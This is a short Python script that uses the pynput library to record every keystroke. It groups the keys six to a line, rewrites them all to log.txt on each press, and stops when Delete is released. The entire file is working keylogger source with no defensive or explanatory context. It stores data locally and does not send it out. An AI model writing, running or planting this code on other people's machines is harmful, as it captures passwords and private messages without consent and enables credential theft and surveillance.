import pynput
from pynput.keyboard import Key, Listener

count = 0
keys = []


def on_press(key):
	global keys, count
	keys.append(key)
	count += 1
	if count >= 6:
		keys.append('\n') #explicitly ending line after 6 keystrokes for readability
		count = 0
	write_file(keys)


def write_file(keys):
	with open('log.txt', 'w') as f:
		for key in keys:
			k = str(key).replace("'","") #removing ''
			f.write(' ') #explicitly adding a space after a keystroke for readability
			f.write(str(k))

def on_release(key):
	if key == Key.delete:
		return False


with Listener(on_press=on_press, on_release=on_release) as listener:
	listener.join()
